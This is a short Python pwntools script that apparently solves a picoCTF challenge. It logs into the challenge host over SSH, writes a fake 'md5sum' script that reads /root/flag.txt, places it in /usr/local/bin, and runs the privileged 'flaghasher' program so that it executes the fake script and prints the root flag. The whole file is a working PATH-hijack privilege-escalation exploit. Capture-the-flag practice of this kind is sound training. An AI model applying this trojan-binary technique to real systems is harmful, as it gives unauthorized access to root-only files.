#!/bin/python3

from pwn import *

print("Enter pico server: ")
print("[ssh ctf-player@rescued-float.picoctf.net -p 63850]")
server_url = input("> ")
server_url = server_url.split(" ")

password = input("Enter password of the server \n> ")

try:
    s = ssh(user="ctf-player", host="rescued-float.picoctf.net", port=int(server_url[-1]), password=password, cache=False)
except Exception as e:
    print(f"Failed to connect to {' '.join(server_url)}")
    exit(1)

p = s.process("echo -e '#!/bin/bash' | tee md5sum")
p = s.process("echo -e 'cat /root/flag.txt' | tee -a md5sum")

p = s.process("chmod +x md5sum")
p = s.process("mv md5sum /usr/local/bin")

p = s.process("flaghasher")
print(p.recvall().decode("latin-1"))

s.close()

